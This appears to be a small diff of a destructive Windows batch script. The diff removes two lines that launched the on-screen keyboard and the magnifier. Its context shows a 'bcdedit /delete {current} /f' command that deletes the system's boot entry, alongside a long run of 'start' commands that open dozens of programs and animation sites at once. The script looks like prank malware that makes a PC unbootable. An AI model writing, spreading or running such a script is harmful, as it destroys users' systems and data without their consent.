@@ -187,7 +187,6 @@ bcdedit /delete {current} /f
     start curl ascii.live/rick>nul
     start curl ascii.live/dvd>nul
     start curl parrot.live>nul
-    start osk>nul
     start regedit>nul
     start winver>nul
     start mspaint>nul
@@ -195,7 +194,6 @@ bcdedit /delete {current} /f
     start wscript>nul
     start cleanmgr>nul
     start certmgr>nul
-    start magnify>nul
     start notepad>nul
     start cmd>nul
     start iexplore>nul
